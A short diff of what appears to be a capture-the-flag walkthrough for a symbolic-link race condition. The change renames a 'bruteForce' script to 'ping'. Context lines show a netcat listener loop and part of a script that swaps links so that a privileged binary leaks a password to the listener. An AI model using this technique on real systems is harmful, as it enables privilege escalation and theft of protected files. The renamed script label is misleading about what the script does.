@@ -53,10 +53,10 @@ vim listener.sh
 #!/bin/sh
 while [ 42 ] ; do nc -l 6969; done
 
-# We create a shell script that will try to bruteforce this race condition: It will call the binary between two calls to ln to try to 
+# We create a shell script that will try to ping this race condition: It will call the binary between two calls to ln to try to 
 #	change the symbolic link running. We see the following password in our second shell:
 
-vim bruteForce.sh
+vim ping.sh
 #!/bin/sh
 touch /tmp/gabe
   while true; do
@@ -67,7 +67,7 @@ touch /tmp/gabe
 
 # Note you will need 2 terminals conntected to the ssh level10@192.168.56.101 -p 4242
 # 	Run the listener.sh first on the one.
-#		On the other run bruteforce.sh
+#		On the other run ping.sh
 #	once you see the below then stop the listener.sh with control c
 
 .*( )*.
